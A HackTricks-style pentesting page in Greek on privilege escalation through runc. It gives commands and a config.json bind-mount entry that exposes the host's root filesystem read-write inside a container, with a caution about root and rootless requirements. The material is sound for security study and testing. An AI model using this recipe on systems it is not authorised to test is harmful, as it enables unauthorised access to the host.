# Κλιμάκωση Privilege του RunC

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Αν θέλετε να μάθετε περισσότερα για το **runc**, δείτε την ακόλουθη σελίδα:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Αν το `runc` είναι διαθέσιμο σε μια rootful διεργασία στο host, μπορείτε να χρησιμοποιήσετε ένα OCI bundle του οποίου η mount configuration εκτελεί recursively bind-mount του host `/` στο `/` μέσα στο container, εκθέτοντας το filesystem του host σε εκείνο το mount namespace.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Η τεκμηριωμένη ροή εργασίας `runc run` είναι rootful: τα παραδείγματα του ίδιου του runc την επισημαίνουν ως "run as root." Ένας unprivileged χρήστης χρειάζεται μια rootless διαμόρφωση, όπως `runc spec --rootless`, και το runc τεκμηριώνει ότι τα user namespaces πρέπει να είναι ενεργοποιημένα για αυτήν τη λειτουργία.<sup>[[1]](#references)</sup>

## References

- [1] [runc: CLI εργαλείο για τη δημιουργία και εκτέλεση containers](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
